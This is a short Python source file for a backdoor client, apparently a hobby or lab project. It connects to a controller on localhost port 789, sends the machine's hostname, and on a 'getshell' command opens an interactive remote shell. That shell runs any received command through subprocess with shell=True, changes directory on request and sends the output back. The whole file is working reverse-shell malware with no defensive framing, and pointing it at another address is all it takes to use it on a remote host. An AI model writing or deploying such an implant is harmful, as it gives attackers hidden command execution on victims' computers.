import os
import socket
import constants
import subprocess
import threading


class client:
    def __init__(self):
        self.temp_output = ""
        self.connect_to_backdoor()

    def run_shell_cmd(self, shell_cmd):
        try:
            result = subprocess.run(shell_cmd, shell=True, capture_output=True)
            if result.returncode == 0:
                return result.stdout
            else:
                print("Status code:" + str(result.returncode))
                return result.stderr
        except BaseException as e:
            pass

    def connect_to_backdoor(self):
        self.socket = socket.socket()
        self.socket.connect(("localhost", 789))
        hostname = socket.gethostname().encode()
        self.socket.send(hostname)
        while True:
            cmd = self.socket.recv(1024)
            cmd = cmd.decode()
            if cmd == "getshell":
                cwd = os.getcwd().encode()
                self.socket.send(cwd)
                while True:
                    shell_cmd = self.socket.recv(4096).decode()

                    if shell_cmd == "exit":
                        break

                    if shell_cmd[:2] == "cd":
                        dir_from_shell_cmd = shell_cmd[3:]
                        os.chdir(dir_from_shell_cmd)
                        self.socket.send(os.getcwd().encode())
                        continue

                    output = self.run_shell_cmd(shell_cmd)
                    self.socket.send(output)


client()
